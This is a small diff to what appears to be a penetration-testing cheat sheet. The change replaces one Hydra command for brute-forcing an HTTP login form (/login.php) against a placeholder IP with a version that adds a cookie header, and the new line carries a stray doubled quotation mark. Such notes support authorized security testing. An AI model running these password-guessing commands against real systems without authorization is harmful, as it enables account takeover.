@@ -26,7 +26,9 @@ TODO: Provide every syntax of it's usage for hydra to brute force whatever type 
 
 `$ hydra -L users.lst -P passwords.lst http-form-post "/login.php:user=^USER^&pass=^PASS^:Incorrect Password" -vV -f <IP>`
 
-`$ hydra -L users.lst -P passwords.lst http-form-post "/login.php:user=^USER^&pass=^PASS^:F=<form name='login'" -vV -f <IP>`
+```
+$ hydra -L users.lst -P passwords.lst http-form-post "/login.php:user=^USER^&pass=^PASS^:H=Cookie:<cookies_keys_and_values>:F=<invalid_response>"" -vV -f <IP>
+```
 
 ## 06 - HTTP-PROXY
 
